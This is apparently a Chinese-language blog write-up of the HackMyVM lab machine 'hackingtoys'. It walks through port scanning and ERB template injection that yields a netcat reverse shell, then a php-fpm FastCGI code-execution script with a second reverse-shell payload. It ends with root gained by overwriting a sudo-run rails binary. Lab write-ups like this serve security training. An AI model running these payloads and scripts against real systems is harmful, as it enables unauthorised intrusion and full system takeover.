@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="zh-CN"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>hvm-hackingtoys - yulian Lab</title><meta name="description" content="Life is a journey — pause and see more."><link rel="stylesheet" href="/_astro/_page_.B12lxv6h.css"></head> <body> <header id="header" class="clearfix"> <div class="container"> <div class="row"> <div class="site-name col-mb-12 col-9"> <a id="logo" href="/">yulian Lab</a>
+                    <p class="description">Life is a journey — pause and see more.</p> </div> <div class="site-search col-3 kit-hidden-tb"> <form id="search" method="get" action="/search" role="search"> <label for="s" class="sr-only">搜索</label> <input type="text" id="s" name="q" class="text" placeholder="输入关键字搜索"> <button type="submit" class="submit">搜索</button> </form> </div> <div class="col-mb-12"> <nav id="nav-menu" class="clearfix" role="navigation"> <a class href="/">首页</a> <a class href="/about" title="关于">关于</a> </nav> </div> </div> </div> </header> <div id="body"> <div class="container"> <div class="row">  <div class="col-mb-12 col-8" id="main" role="main"> <article class="post" itemscope itemtype="http://schema.org/BlogPosting"> <h2 class="post-title" itemprop="name headline"> <a itemprop="url" href="/post/hvm-hackingtoys">hvm-hackingtoys</a> </h2> <ul class="post-meta">  <li>时间: <time datetime="2024-09-16T00:00:00.000Z" itemprop="datePublished">2024/09/16</time></li> <li>分类: <a href="/category/渗透">渗透</a></li> </ul> <div class="post-content" itemprop="articleBody"> <h2 id="信息收集">信息收集</h2>
+<p>nmap扫端口</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#6F42C1">nmap</span><span style="color:#005CC5"> -sS</span><span style="color:#005CC5"> 10.20.73.121</span><span style="color:#005CC5"> -T4</span></span></code></pre>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-16 03:48 EDT</span></span>
+<span class="line"><span>Nmap scan report for hacktoys.lan (10.20.73.121)</span></span>
+<span class="line"><span>Host is up (0.00010s latency).</span></span>
+<span class="line"><span>Not shown: 998 closed tcp ports (reset)</span></span>
+<span class="line"><span>PORT     STATE SERVICE</span></span>
+<span class="line"><span>22/tcp   open  ssh</span></span>
+<span class="line"><span>3000/tcp open  ppp</span></span>
+<span class="line"><span>MAC Address: 00:0C:29:82:76:43 (VMware)</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds</span></span></code></pre>
+<p>开了22 和 3000端口，nmap -sV 扫详细服务</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#6F42C1">nmap</span><span style="color:#005CC5"> -sV</span><span style="color:#005CC5">  10.20.73.121</span><span style="color:#005CC5"> -p3000,22</span></span></code></pre>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>┌──(root㉿kali)-[~]</span></span>
+<span class="line"><span>└─# nmap -sV  10.20.73.121 -p3000,22</span></span>
+<span class="line"><span>Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-16 03:49 EDT</span></span>
+<span class="line"><span>Nmap scan report for hacktoys.lan (10.20.73.121)</span></span>
+<span class="line"><span>Host is up (0.00031s latency).</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>PORT     STATE SERVICE  VERSION</span></span>
+<span class="line"><span>22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span></span>
+<span class="line"><span>3000/tcp open  ssl/ppp?</span></span>
+<span class="line"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span></span>
+<span class="line"><span>SF-Port3000-TCP:V=7.93%T=SSL%I=7%D=9/16%Time=66E7E361%P=x86_64-pc-linux-gn</span></span>
+<span class="line"><span>SF:u%r(GenericLines,3EF,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Len</span></span>
+<span class="line"><span>SF:gth:\x20930\r\n\r\nPuma\x20caught\x20this\x20error:\x20Invalid\x20HTTP\</span></span>
+<span class="line"><span>SF:x20format,\x20parsing\x20fails\.\x20Are\x20you\x20trying\x20to\x20open\</span></span>
+<span class="line"><span>SF:x20an\x20SSL\x20connection\x20to\x20a\x20non-SSL\x20Puma\?\x20\(Puma::H</span></span>
+<span class="line"><span>SF:ttpParserError\)\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/li</span></span>
+<span class="line"><span>SF:b/puma/client\.rb:268:in\x20`execute'\n/usr/local/rvm/gems/ruby-3\.1\.0</span></span>
+<span class="line"><span>SF:/gems/puma-6\.4\.2/lib/puma/client\.rb:268:in\x20`try_to_finish'\n/usr/</span></span>
+<span class="line"><span>SF:local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/server\.rb:298:i</span></span>
+<span class="line"><span>SF:n\x20`reactor_wakeup'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\</span></span>
+<span class="line"><span>SF:.2/lib/puma/server\.rb:248:in\x20`block\x20in\x20run'\n/usr/local/rvm/g</span></span>
+<span class="line"><span>SF:ems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:119:in\x20`wake</span></span>
+<span class="line"><span>SF:up!'\n/usr/local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/react</span></span>
+<span class="line"><span>SF:or\.rb:76:in\x20`block\x20in\x20select_loop'\n/usr/local/rvm/gems/ruby-</span></span>
+<span class="line"><span>SF:3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:76:in\x20`select'\n/usr/</span></span>
+<span class="line"><span>SF:local/rvm/gems/ruby-3\.1\.0/gems/puma-6\.4\.2/lib/puma/reactor\.rb:76:i</span></span>
+<span class="line"><span>SF:n\x20`select_loop'\n/usr/loc")%r(GetRequest,169E,"HTTP/1\.0\x20403\x20F</span></span>
+<span class="line"><span>SF:orbidden\r\ncontent-type:\x20text/html;\x20charset=UTF-8\r\nContent-Len</span></span>
+<span class="line"><span>SF:gth:\x205702\r\n\r\n&#x3C;!DOCTYPE\x20html>\n&#x3C;html\x20lang=\"en\">\n&#x3C;head>\n</span></span>
+<span class="line"><span>SF:\x20\x20&#x3C;meta\x20charset=\"utf-8\"\x20/>\n\x20\x20&#x3C;meta\x20name=\"viewp</span></span>
+<span class="line"><span>SF:ort\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\x20\x20&#x3C;</span></span>
+<span class="line"><span>SF:meta\x20name=\"turbo-visit-control\"\x20content=\"reload\">\n\x20\x20&#x3C;t</span></span>
+<span class="line"><span>SF:itle>Action\x20Controller:\x20Exception\x20caught&#x3C;/title>\n\x20\x20&#x3C;sty</span></span>
+<span class="line"><span>SF:le>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20background-colo</span></span>
+<span class="line"><span>SF:r:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20\x20\x20\x</span></span>
+<span class="line"><span>SF:20\x20\x20color-scheme:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x20supp</span></span>
+<span class="line"><span>SF:orted-color-schemes:\x20light\x20dark;\n\x20\x20\x20\x20\x20\x20margin:</span></span>
+<span class="line"><span>SF:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul</span></span>
+<span class="line"><span>SF:,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-family:\x20helvetica,\x20ver</span></span>
+<span class="line"><span>SF:dana,\x20arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\</span></span>
+<span class="line"><span>SF:x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x</span></span>
+<span class="line"><span>SF:20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:</span></span>
+<span class="line"><span>SF:\x2011px;\n\x20\x20\x20\x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\</span></span>
+<span class="line"><span>SF:x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20bord</span></span>
+<span class="line"><span>SF:er:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;</span></span>
+<span class="line"><span>SF:\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20\x20\x20widt</span></span>
+<span class="line"><span>SF:h:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x2</span></span>
+<span class="line"><span>SF:0\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background</span></span>
+<span class="line"><span>SF::\x20#C00;\n\x20\x20\x20\x20\x20\x20padding:");</span></span>
+<span class="line"><span>MAC Address: 00:0C:29:82:76:43 (VMware)</span></span>
+<span class="line"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span>
+<span class="line"><span>Nmap done: 1 IP address (1 host up) scanned in 66.17 seconds</span></span></code></pre>
+<p>看到了ssl，尝试使用https访问</p>
+<p><img alt="image-20240916160728361" loading="lazy" decoding="async" fetchpriority="auto" width="1079" height="739" src="/_astro/image-20240916160728361.Riw7fvHb_Z2mKTUn.webp" ></p>
+<h2 id="漏洞发现">漏洞发现</h2>
+<h3 id="web打点">web打点</h3>
+<p>查看这五个链接，如图所示，这五个链接都是黑客工具</p>
+<p><img alt="image-20240916171846634" loading="lazy" decoding="async" fetchpriority="auto" width="1230" height="899" src="/_astro/image-20240916171846634.BzJL76Y3_Z8fTka.webp" ></p>
+<p>接下来测试下面的输入框</p>
+<p><img alt="image-20240916172453682" loading="lazy" decoding="async" fetchpriority="auto" width="981" height="585" src="/_astro/image-20240916172453682.Dhf20lEl_HXgyO.webp" ></p>
+<p>随意输入内容提示<code>Product does not exist</code></p>
+<p>发现这串字符串就是message的参数，修改message为123查看</p>
+<p><img alt="image-20240916172632531" loading="lazy" decoding="async" fetchpriority="auto" width="1116" height="850" src="/_astro/image-20240916172632531.BSObxNvk_Z1tnzkQ.webp" ></p>
+<p>提示的字符变成了123，这边很明显有一个xss漏洞</p>
+<p>不过并没什么用</p>
+<p><img alt="image-20240916173245082" loading="lazy" decoding="async" fetchpriority="auto" width="1684" height="854" src="/_astro/image-20240916173245082.BNjimJQD_Z1v9Si1.webp" ></p>
+<p>查看网站变成语言，是ruby</p>
+<p><img alt="image-20240916173606124" loading="lazy" decoding="async" fetchpriority="auto" width="908" height="767" src="/_astro/image-20240916173606124.BjXvEUea_ZVBVM2.webp" ></p>
+<h3 id="rubyerb-ssti">Ruby/ERB ssti</h3>
+<p>经过搜索，这里是ERB的ssti，可用使用<code>&#x3C;%= (ruby代码) %></code>模板来执行命名</p>
+<p>测试一下，将<code>&#x3C;%= 7*7 %></code>url编码传入</p>
+<p><img alt="image-20240916180036622" loading="lazy" decoding="async" fetchpriority="auto" width="1236" height="900" src="/_astro/image-20240916180036622.Cqvc-3aN_Zw5Mlv.webp" ></p>
+<p>输入了49，说名存在漏洞</p>
+<p>尝试反弹shell</p>
+<p>构造反弹shell命令</p>
+<p><code>&#x3C;%= system("nc -e /bin/sh 10.20.73.233 5555"); %></code></p>
+<p><img alt="image-20240916182837479" loading="lazy" decoding="async" fetchpriority="auto" width="1706" height="809" src="/_astro/image-20240916182837479.DNG1H8wy_2w8HID.webp" ></p>
+<p><img alt="image-20240916182939850" loading="lazy" decoding="async" fetchpriority="auto" width="707" height="279" src="/_astro/image-20240916182939850.wCUokQuD_Z1EF7my.webp" ></p>
+<p>有pyhton ，使用python开一下虚拟终端</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="shell"><code><span class="line"><span style="color:#6F42C1">python3</span><span style="color:#005CC5"> -c</span><span style="color:#032F62"> "import pty;pty.spawn('/bin/bash')"</span></span></code></pre>
+<p><img alt="image-20240916183154924" loading="lazy" decoding="async" fetchpriority="auto" width="724" height="216" src="/_astro/image-20240916183154924.H06CNZj3_3tPAR.webp" ></p>
+<h2 id="提取">提取</h2>
+<p><img alt="image-20240916200655562" loading="lazy" decoding="async" fetchpriority="auto" width="1048" height="227" src="/_astro/image-20240916200655562.DW43hlJD_Z2iHLEk.webp" ></p>
+<p>在本地开了一个80，9000端口，将这两个端口转发出来</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:9001,reuseaddr,fork TCP:127.0.0.1:9000 &#x26; </span></span>
+<span class="line"><span>&#x3C;CP-LISTEN:9001,reuseaddr,fork TCP:127.0.0.1:9000 &#x26; </span></span>
+<span class="line"><span>[1] 1281</span></span>
+<span class="line"><span>lidia@hacktoys:/tmp$ ./socat TCP-LISTEN:8080,reuseaddr,fork TCP:127.0.0.1:80 &#x26; </span></span>
+<span class="line"><span>&#x3C; TCP-LISTEN:8080,reuseaddr,fork TCP:127.0.0.1:80 &#x26; </span></span>
+<span class="line"><span>[2] 1282</span></span>
+<span class="line"><span>lidia@hacktoys:/tmp$ ss -nltp </span></span>
+<span class="line"><span>ss -nltp </span></span>
+<span class="line"><span>State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                         </span></span>
+<span class="line"><span>LISTEN 0      5            0.0.0.0:8080      0.0.0.0:*    users:(("socat",pid=1282,fd=5))</span></span>
+<span class="line"><span>LISTEN 0      511        127.0.0.1:80        0.0.0.0:*                                   </span></span>
+<span class="line"><span>LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                   </span></span>
+<span class="line"><span>LISTEN 0      4096       127.0.0.1:9000      0.0.0.0:*                                   </span></span>
+<span class="line"><span>LISTEN 0      1024         0.0.0.0:3000      0.0.0.0:*    users:(("ruby",pid=593,fd=7))  </span></span>
+<span class="line"><span>LISTEN 0      5            0.0.0.0:9001      0.0.0.0:*    users:(("socat",pid=1281,fd=5))</span></span>
+<span class="line"><span>LISTEN 0      128             [::]:22           [::]:*                                                                </span></span></code></pre>
+<p>访问转发出来的 80端口</p>
+<p><img alt="image-20240916202945326" loading="lazy" decoding="async" fetchpriority="auto" width="2540" height="1264" src="/_astro/image-20240916202945326.CXw3j3LP_Z68nd6.webp" ></p>
+<p>测了半天也找到什么漏洞</p>
+<p>转移目标至9000端口</p>
+<p><img alt="image-20240916203819728" loading="lazy" decoding="async" fetchpriority="auto" width="1338" height="531" src="/_astro/image-20240916203819728.DP_fRFPc_29YErD.webp" ></p>
+<p>发现靶机进程中有<code>php-fpm</code>，它的默认端口正好是<code>9000</code></p>
+<p><a href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi">https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi</a></p>
+<p>在网上找到大佬的的脚本可以直接命令执行</p>
+<p>改个端口和路径就能直接打</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">PAYLOAD</span><span style="color:#D73A49">=</span><span style="color:#032F62">"&#x3C;?php echo '&#x3C;!--'; system('whoami'); echo '-->';"</span></span>
+<span class="line"><span style="color:#24292E">FILENAMES</span><span style="color:#D73A49">=</span><span style="color:#032F62">"/var/www/html/index.php"</span><span style="color:#6A737D"> # Exisiting file path</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">HOST</span><span style="color:#D73A49">=</span><span style="color:#E36209">$1</span></span>
+<span class="line"><span style="color:#24292E">B64</span><span style="color:#D73A49">=</span><span style="color:#24292E">$(</span><span style="color:#005CC5">echo</span><span style="color:#032F62"> "</span><span style="color:#24292E">$PAYLOAD</span><span style="color:#032F62">"</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">base64</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">for</span><span style="color:#24292E"> FN </span><span style="color:#D73A49">in</span><span style="color:#24292E"> $FILENAMES; </span><span style="color:#D73A49">do</span></span>
+<span class="line"><span style="color:#24292E">    OUTPUT</span><span style="color:#D73A49">=</span><span style="color:#24292E">$(</span><span style="color:#6F42C1">mktemp</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#6F42C1">    env</span><span style="color:#005CC5"> -i</span><span style="color:#005CC5"> \</span></span>
+<span class="line"><span style="color:#032F62">      PHP_VALUE="allow_url_include=1"$'</span><span style="color:#005CC5">\n</span><span style="color:#032F62">'"allow_url_fopen=1"$'</span><span style="color:#005CC5">\n</span><span style="color:#032F62">'"auto_prepend_file='data://text/plain\;base64,</span><span style="color:#24292E">$B64</span><span style="color:#032F62">'"</span><span style="color:#005CC5"> \</span></span>
+<span class="line"><span style="color:#032F62">      SCRIPT_FILENAME=</span><span style="color:#24292E">$FN </span><span style="color:#032F62">SCRIPT_NAME=</span><span style="color:#24292E">$FN </span><span style="color:#032F62">REQUEST_METHOD=POST</span><span style="color:#005CC5"> \</span></span>
+<span class="line"><span style="color:#032F62">      cgi-fcgi</span><span style="color:#005CC5"> -bind</span><span style="color:#005CC5"> -connect</span><span style="color:#24292E"> $HOST</span><span style="color:#032F62">:9001</span><span style="color:#24292E"> &#x26;</span><span style="color:#D73A49">></span><span style="color:#24292E"> $OUTPUT</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">    cat</span><span style="color:#24292E"> $OUTPUT</span></span>
+<span class="line"><span style="color:#D73A49">done</span></span></code></pre>
+<p><img alt="image-20240916205923580" loading="lazy" decoding="async" fetchpriority="auto" width="994" height="397" src="/_astro/image-20240916205923580.OQLDlqYV_2aAydo.webp" ></p>
+<p>发现使用<code>dodi</code>用户，直接反弹shell提权至该用户</p>
+<h3 id="提权至dodi">提权至dodi</h3>
+<p>修改执行的命令</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D">#!/bin/bash</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">PAYLOAD</span><span style="color:#D73A49">=</span><span style="color:#032F62">"&#x3C;?php echo '&#x3C;!--'; system('nc -e /bin/bash 10.20.73.233 6666'); echo '-->';"</span></span>
+<span class="line"><span style="color:#24292E">FILENAMES</span><span style="color:#D73A49">=</span><span style="color:#032F62">"/var/www/html/index.php"</span><span style="color:#6A737D"> # Exisiting file path</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#24292E">HOST</span><span style="color:#D73A49">=</span><span style="color:#E36209">$1</span></span>
+<span class="line"><span style="color:#24292E">B64</span><span style="color:#D73A49">=</span><span style="color:#24292E">$(</span><span style="color:#005CC5">echo</span><span style="color:#032F62"> "</span><span style="color:#24292E">$PAYLOAD</span><span style="color:#032F62">"</span><span style="color:#D73A49">|</span><span style="color:#6F42C1">base64</span><span style="color:#24292E">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#D73A49">for</span><span style="color:#24292E"> FN </span><span style="color:#D73A49">in</span><span style="color:#24292E"> $FILENAMES; </span><span style="color:#D73A49">do</span></span>
+<span class="line"><span style="color:#24292E">    OUTPUT</span><span style="color:#D73A49">=</span><span style="color:#24292E">$(</span><span style="color:#6F42C1">mktemp</span><span style="color:#24292E">)</span></span>
+<span class="line"><span style="color:#6F42C1">    env</span><span style="color:#005CC5"> -i</span><span style="color:#005CC5"> \</span></span>
+<span class="line"><span style="color:#032F62">      PHP_VALUE="allow_url_include=1"$'</span><span style="color:#005CC5">\n</span><span style="color:#032F62">'"allow_url_fopen=1"$'</span><span style="color:#005CC5">\n</span><span style="color:#032F62">'"auto_prepend_file='data://text/plain\;base64,</span><span style="color:#24292E">$B64</span><span style="color:#032F62">'"</span><span style="color:#005CC5"> \</span></span>
+<span class="line"><span style="color:#032F62">      SCRIPT_FILENAME=</span><span style="color:#24292E">$FN </span><span style="color:#032F62">SCRIPT_NAME=</span><span style="color:#24292E">$FN </span><span style="color:#032F62">REQUEST_METHOD=POST</span><span style="color:#005CC5"> \</span></span>
+<span class="line"><span style="color:#032F62">      cgi-fcgi</span><span style="color:#005CC5"> -bind</span><span style="color:#005CC5"> -connect</span><span style="color:#24292E"> $HOST</span><span style="color:#032F62">:9001</span><span style="color:#24292E"> &#x26;</span><span style="color:#D73A49">></span><span style="color:#24292E"> $OUTPUT</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6F42C1">    cat</span><span style="color:#24292E"> $OUTPUT</span></span>
+<span class="line"><span style="color:#D73A49">done</span></span></code></pre>
+<p><img alt="image-20240916210302784" loading="lazy" decoding="async" fetchpriority="auto" width="1007" height="355" src="/_astro/image-20240916210302784.D7W5jAjg_Z2t4vsP.webp" ></p>
+<h3 id="提权至root">提权至root</h3>
+<p>sudo -l 发现该用户可以使用sudo运行<code>/usr/local/bin/rvm_rails.sh</code>这个脚本</p>
+<p><img alt="image-20240916210822816" loading="lazy" decoding="async" fetchpriority="auto" width="1090" height="266" src="/_astro/image-20240916210822816.Do6l3Uqm_Z2qaiGo.webp" ></p>
+<p>运行脚本</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>dodi@hacktoys:/var/www/html$ sudo /usr/local/bin/rvm_rails.sh</span></span>
+<span class="line"><span>sudo /usr/local/bin/rvm_rails.sh</span></span>
+<span class="line"><span>Usage:</span></span>
+<span class="line"><span>  rails COMMAND [options]</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>You must specify a command:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  new          Create a new Rails application. "rails new my_app" creates a</span></span>
+<span class="line"><span>               new application called MyApp in "./my_app"</span></span>
+<span class="line"><span>  plugin new   Create a new Rails railtie or engine</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>All commands can be run with -h (or --help) for more information.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>Inside a Rails application directory, some common commands are:</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  console      Start the Rails console</span></span>
+<span class="line"><span>  server       Start the Rails server</span></span>
+<span class="line"><span>  test         Run tests except system tests</span></span></code></pre>
+<p>发现是<code>rails </code></p>
+<p><code>Rails </code>是使用Ruby 语言编写的网页程序开发框架</p>
+<p>分析脚本</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6A737D">#!/bin/bash</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> rvm_prefix</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> MY_RUBY_HOME</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local/rvm/rubies/ruby-3.1.0</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> RUBY_VERSION</span><span style="color:#D73A49">=</span><span style="color:#24292E">ruby-3.1.0</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> rvm_version</span><span style="color:#D73A49">=</span><span style="color:#005CC5">1.29.12</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> rvm_bin_path</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local/rvm/bin</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> GEM_PATH</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local/rvm/gems/ruby-3.1.0:/usr/local/rvm/gems/ruby-3.1.0@global</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> GEM_HOME</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local/rvm/gems/ruby-3.1.0</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> PATH</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local/rvm/gems/ruby-3.1.0/bin:/usr/local/rvm/gems/ruby-3.1.0@global/bin:/usr/local/rvm/rubies/ruby-3.1.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> IRBRC</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local/rvm/rubies/ruby-3.1.0/.irbrc</span></span>
+<span class="line"><span style="color:#D73A49">export</span><span style="color:#24292E"> rvm_path</span><span style="color:#D73A49">=</span><span style="color:#24292E">/usr/local/rvm</span></span>
+<span class="line"><span style="color:#005CC5">exec</span><span style="color:#032F62"> /usr/local/rvm/gems/ruby-3.1.0/bin/rails</span><span style="color:#032F62"> "</span><span style="color:#005CC5">$@</span><span style="color:#032F62">"</span></span></code></pre>
+<p>脚本之后执行了<code>/usr/local/rvm/gems/ruby-3.1.0/bin/rails</code>这个文件</p>
+<p><img alt="image-20240916211743699" loading="lazy" decoding="async" fetchpriority="auto" width="973" height="135" src="/_astro/image-20240916211743699.4FTXoNLf_1IaPIs.webp" ></p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>dodi@hacktoys:/var/www/html$ cat /etc/group | grep rvm</span></span>
+<span class="line"><span>cat /etc/group | grep rvm</span></span>
+<span class="line"><span>rvm:x:1002:lidia,root</span></span></code></pre>
+<p><code>lidia</code>用户对该文件有修改权限，使用该用户在这个文件中写入<code>/bin/bash</code>即可提权</p>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>lidia@hacktoys:/tmp$ echo "/bin/bash" > /usr/local/rvm/gems/ruby-3.1.0/bin/rails</span></span>
+<span class="line"><span>&#x3C;in/bash" > /usr/local/rvm/gems/ruby-3.1.0/bin/rails</span></span>
+<span class="line"><span>lidia@hacktoys:/tmp$ </span></span></code></pre>
+<pre class="astro-code github-light" style="background-color:#fff;color:#24292e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>dodi@hacktoys:/var/www/html$ sudo /usr/local/bin/rvm_rails.sh</span></span>
+<span class="line"><span>sudo /usr/local/bin/rvm_rails.sh</span></span>
+<span class="line"><span>root@hacktoys:/var/www/html# id</span></span>
+<span class="line"><span>id</span></span>
+<span class="line"><span>uid=0(root) gid=0(root) groups=0(root),1002(rvm)</span></span>
+<span class="line"><span>root@hacktoys:/var/www/html# cd /root</span></span>
+<span class="line"><span>cd /root</span></span>
+<span class="line"><span>root@hacktoys:~# ls</span></span>
+<span class="line"><span>ls</span></span>
+<span class="line"><span>root.txt</span></span>
+<span class="line"><span>root@hacktoys:~# cat root.txt</span></span>
+<span class="line"><span>cat root.txt</span></span>
+<span class="line"><span>64aa5a7aaf42af74ee6b59d5ac5c1509</span></span>
+<span class="line"><span>root@hacktoys:~# </span></span></code></pre> </div> <p itemprop="keywords" class="tags">标签: 渗透, hackmyvm, hackingtoys</p> </article> <ul class="post-near"> <li>上一篇: 没有了</li> <li>下一篇: <a href="/post/dasctf-2024-reverse">第七届浙江省大学生网络与信息安全竞赛决赛reverse-wp</a></li> </ul> </div>  <div class="col-mb-12 col-offset-1 col-3 kit-hidden-tb" id="secondary" role="complementary"> <section class="widget" id="toc-widget"> <h3 class="widget-title">文章目录</h3> <ul class="widget-list toc-list"> <li class="toc-level-2"> <a href="#信息收集" data-target="信息收集">信息收集</a> </li><li class="toc-level-2"> <a href="#漏洞发现" data-target="漏洞发现">漏洞发现</a> </li><li class="toc-level-3"> <a href="#web打点" data-target="web打点">web打点</a> </li><li class="toc-level-3"> <a href="#rubyerb-ssti" data-target="rubyerb-ssti">Ruby/ERB ssti</a> </li><li class="toc-level-2"> <a href="#提取" data-target="提取">提取</a> </li><li class="toc-level-3"> <a href="#提权至dodi" data-target="提权至dodi">提权至dodi</a> </li><li class="toc-level-3"> <a href="#提权至root" data-target="提权至root">提权至root</a> </li> </ul> </section> <section class="widget"> <h3 class="widget-title">最新文章</h3> <ul class="widget-list"> <li><a href="/post/ycb-2025-reverse-plus">2025羊城杯初赛Reverse-PLUS详细wp</a></li><li><a href="/post/ycb-2025-writeup">2025羊城杯初赛部分wp</a></li><li><a href="/post/天一永安杯初赛-2025-writeup">第八届宁波市网络安全大赛reverse-wp</a></li><li><a href="/post/exchange">群友靶机-exchange</a></li><li><a href="/post/attacking-a-box-news">News</a></li> </ul> </section> <section class="widget"> <h3 class="widget-title">分类</h3> <ul class="widget-list"> <li><a href="/category/CTF">CTF</a></li><li><a href="/category/渗透">渗透</a></li> </ul> </section> <!-- 其它 --> <!-- <section class="widget">
+        <h3 class="widget-title">其它</h3>
+        <ul class="widget-list">
+            <li><a href="/rss.xml">文章 RSS</a></li>
+            <li><a href="https://astro.build">Astro</a></li>
+        </ul>
